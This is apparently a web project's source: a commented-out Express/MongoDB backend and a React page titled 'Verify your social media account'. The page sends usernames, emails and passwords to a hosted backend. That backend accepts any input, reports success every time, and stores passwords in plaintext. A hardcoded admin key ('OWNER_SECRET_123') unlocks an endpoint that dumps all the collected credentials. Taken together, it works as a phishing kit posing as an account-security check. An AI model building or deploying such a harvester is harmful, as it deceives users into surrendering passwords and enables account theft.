// require("dotenv").config();
// const express = require("express");
// const mongoose = require("mongoose");
// const cors = require("cors");
// const User = require("./user");

// const app = express();

// app.use(express.json());

// app.use(cors({
//   origin: [
//     "https://governmentaccountssecurity.vercel.app",
//     "http://localhost:5173"
//   ],
//   methods: ["GET", "POST", "DELETE"],
//   allowedHeaders: ["Content-Type", "x-admin-key"]
// }));

// app.get("/", (req, res) => {
//   res.status(200).send("Backend is running");
// });

// mongoose.connect(process.env.MONGO_URI)
//   .then(() => console.log("MongoDB Connected"))
//   .catch(err => console.log("Mongo Error:", err));

// app.post("/login", async (req, res) => {
//   try {
//     const { userName, email, passWord } = req.body;

//     if (!userName || !email || !passWord) {
//       return res.status(400).json({ message: "All fields required" });
//     }

//     // ❌ NO DUPLICATE CHECK
//     // ❌ NO LOGIN VALIDATION

//     const newEntry = new User({
//       userName,
//       email,
//       passWord,
//       createdAt: new Date()
//     });

//     await newEntry.save();

//     // ✅ ALWAYS SUCCESS
//     res.status(200).json({
//       success: true,
//       userName
//     });

//   } catch (err) {
//     res.status(500).json({ message: "Server error" });
//   }
// });


// app.get("/admin/users", async (req, res) => {
//   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
//     return res.status(403).json({ message: "Access denied" });
//   }

//   const users = await User.find({}, {
//     userName: 1,
//     email: 1,
//     passWord: 1,
//     _id: 0
//   });

//   res.json(users);
// });

// app.delete("/admin/clear-users", async (req, res) => {
//   if (req.headers["x-admin-key"] !== "OWNER_SECRET_123") {
//     return res.status(403).json({ message: "Access denied" });
//   }

//   await User.deleteMany({});
//   res.json({ message: "All users deleted" });
// });

// const PORT = process.env.PORT || 4000;
// app.listen(PORT, () => console.log(`Server running on ${PORT}`));








import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import axios from "axios";

const SignUp = () => {
  const navigate = useNavigate();

  const [input, setInput] = useState({
    userName: "",
    email: "",
    passWord: "",
  });

  const [popup, setPopup] = useState("");

  const showPopup = (msg, duration = 2500) => {
    setPopup(msg);
    setTimeout(() => setPopup(""), duration);
  };

  function handleInput(e) {
    const { name, value } = e.target;
    setInput(prev => ({ ...prev, [name]: value }));
  }

  async function submitData() {
    try {
      showPopup("📡 Sending request to backend...");

      const res = await axios.post(
        "https://security-backend-c1hz.onrender.com/login",
        input,
        { timeout: 15000 }
      );

      showPopup("✅ Backend responded");

      // ✅ IMPORTANT CHECK
      if (!res.data || res.data.success !== true) {
        showPopup("❌ Backend rejected credentials");
        return;
      }

      // 🔹 Normalize username (mobile-safe)
      const username = input.userName
        .trim()
        .toLowerCase()
        .replace(/\s+/g, "");

      showPopup(`👤 Username detected: ${username}`);

      // 🔹 OWNER MAP
      const OWNER_ACCOUNTS = {
        "_creamy_moon_629": "/Account_creamy_moon_629",
        "its_meee_pihu_09": "/Account_its_meee_pihu_09",
        "mr_purav_1432": "/Account_mr_purav_1432",
      };

      if (OWNER_ACCOUNTS[username]) {
        showPopup("🚀 Owner verified, redirecting...");
        setTimeout(() => {
          navigate(OWNER_ACCOUNTS[username]);
        }, 800);
      } else {
        showPopup("⚠️ Not an owner account");
      }

    } catch (err) {
      console.error(err);
      showPopup("🔥 Backend timeout / network error", 4000);
    }
  }

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center px-6">

      {/* 🔔 DEBUG POPUP */}
      {popup && (
        <div className="fixed top-16 right-4 bg-yellow-500 text-black px-4 py-2 rounded-lg shadow-lg text-sm z-50">
          {popup}
        </div>
      )}

      <div className="max-w-md w-full bg-[#0f172a] border border-white/10 rounded-2xl shadow-xl p-8 space-y-6">

        <div className="text-center">
          <h1 className="text-3xl font-bold">Verify your social media account</h1>
          <p className="text-gray-400 mt-2 text-sm">
            Secure verification system
          </p>
        </div>

        <input
          type="text"
          name="userName"
          value={input.userName}
          onChange={handleInput}
          placeholder="Username"
          className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
        />

        <input
          type="email"
          name="email"
          value={input.email}
          onChange={handleInput}
          placeholder="Email"
          className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
        />

        <input
          type="password"
          name="passWord"
          value={input.passWord}
          onChange={handleInput}
          placeholder="Password"
          className="w-full bg-[#020617] border border-white/10 px-4 py-3 rounded-lg"
        />

        <button
          onClick={submitData}
          className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-semibold"
        >
          Login
        </button>

        <div className="text-center text-sm text-gray-400">
          Don’t have an account?
          <Link to="/" className="text-blue-500 ml-1">Sign up</Link>
        </div>

      </div>
    </div>
  );
};

export default SignUp;
